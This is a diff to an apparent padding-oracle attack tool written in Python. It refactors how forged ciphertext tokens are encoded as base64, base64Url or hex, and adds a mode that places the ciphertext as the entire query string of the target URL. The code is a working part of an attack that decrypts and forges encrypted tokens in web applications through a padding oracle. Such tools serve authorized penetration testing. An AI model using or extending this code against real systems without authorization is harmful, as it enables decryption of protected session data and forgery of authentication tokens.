@@ -182,19 +182,28 @@ class Job:
             self._semaphore = asyncio.Semaphore(self.concurrency)
         return self._semaphore
 
+    def encodeToken(self, raw_bytes):
+        """Encode raw ciphertext bytes into the wire format for the request."""
+        if self.encodingMode == 'base64':
+            b64 = bytes_to_base64(raw_bytes).decode()
+            if self.inputMode == 'querystring':
+                return b64
+            return urllib.parse.quote_plus(b64)
+        elif self.encodingMode == 'base64Url':
+            return bytes_to_base64(raw_bytes).decode().replace('=','').replace("+","-").replace('/','_')
+        elif self.encodingMode == 'hex':
+            return raw_bytes.hex().upper()
+
     def oracleSanityCheck(self):
         """Send a random ciphertext to verify the oracle text is detectable in the response."""
         print("[*] Running oracle sanity check...")
 
-        # Generate a random 2-block ciphertext that will almost certainly have invalid padding
-        random_ct = os.urandom(self.blocksize * 2)
+        # Generate a random 3-block ciphertext that will almost certainly have invalid padding.
+        # Must use 3 blocks (not 2) so byte count is divisible by 3, ensuring base64 output
+        # has no '=' padding — matching the attack loop (fakeIV + padding_array + block_data).
+        random_ct = os.urandom(self.blocksize * 3)
 
-        if self.encodingMode == 'base64':
-            test_token = urllib.parse.quote_plus(bytes_to_base64(random_ct))
-        elif self.encodingMode == 'base64Url':
-            test_token = bytes_to_base64(random_ct).decode().replace('=','').replace("+","-").replace('/','_')
-        elif self.encodingMode == 'hex':
-            test_token = random_ct.hex().upper()
+        test_token = self.encodeToken(random_ct)
 
         result = self.makeRequest(test_token)
         oracle_text = self.oracleText.lower()
@@ -278,6 +287,10 @@ class Job:
 
                         # if we already set a GET, additionals should start with "&"
                         firstDelimiter = "&"
+                    elif self.inputMode == 'querystring':
+                        # the ciphertext IS the entire query string (no parameter name)
+                        urlBuilder = urlBuilder + '?' + encryptedstring
+                        firstDelimiter = "&"
                     else:
                         firstDelimiter = "?"
 
@@ -340,6 +353,9 @@ class Job:
             urlBuilder = self.URL
             if self.inputMode == 'parameter':
                 urlBuilder = urlBuilder + '?' + self.vulnerableParameter + '=' + encryptedstring
+                firstDelimiter = "&"
+            elif self.inputMode == 'querystring':
+                urlBuilder = urlBuilder + '?' + encryptedstring
                 firstDelimiter = "&"
             else:
                 firstDelimiter = "?"
@@ -405,12 +421,7 @@ class Job:
             else:
                 tempTokenBytes = bytearray(self.fakeIV() + padding_array + block_data)
 
-            if self.encodingMode == 'base64':
-                tempToken = urllib.parse.quote_plus(bytes_to_base64(tempTokenBytes))
-            elif self.encodingMode == 'base64Url':
-                tempToken = bytes_to_base64(bytes(tempTokenBytes)).decode().replace('=','').replace("+","-").replace('/','_')
-            elif self.encodingMode == 'hex':
-                tempToken = tempTokenBytes.hex().upper()
+            tempToken = self.encodeToken(bytes(tempTokenBytes))
 
             result = await self.makeRequestAsync(tempToken, progress=progress)
 
@@ -617,15 +628,8 @@ class Job:
             # add in the "first" (last) block of all 0's
             joinedCrypto = b''.join([joinedCrypto,bytes([0] * self.blocksize)])
 
-            if self.encodingMode == 'base64':
-                encryptTemp = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
-
-            if self.encodingMode == "base64Url":
-                encryptTemp = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
-
-            if self.encodingMode == 'hex':
-                encryptTemp = joinedCrypto.hex().upper()
-            oracleCheckResult = self.makeRequest(encryptTemp) #make the request with the messed with encryptedstring
+            encryptTemp = self.encodeToken(joinedCrypto)
+            oracleCheckResult = self.makeRequest(encryptTemp)
 
             #if the oracleCheck failed... (not solved)
             if not self.oracleCheck(oracleCheckResult):
@@ -954,14 +958,7 @@ async def async_main():
             # add in the "first" (last) bock of all 0's
             joinedCrypto = b''.join([joinedCrypto,bytes([0] * job.blocksize)])
 
-        if job.encodingMode == 'base64':
-            encryptFinal = b64urlEncode(urllib.parse.quote_plus(bytes_to_base64(joinedCrypto)))
-
-        if job.encodingMode == 'base64Url':
-            encryptFinal = bytes_to_base64(joinedCrypto).decode().replace('=','').replace("+","-").replace('/','_')
-
-        if job.encodingMode == 'hex':
-            encryptFinal = joinedCrypto.hex().upper()
+        encryptFinal = job.encodeToken(joinedCrypto)
 
         print(f"[!]Encrypt final result: {encryptFinal}")
 
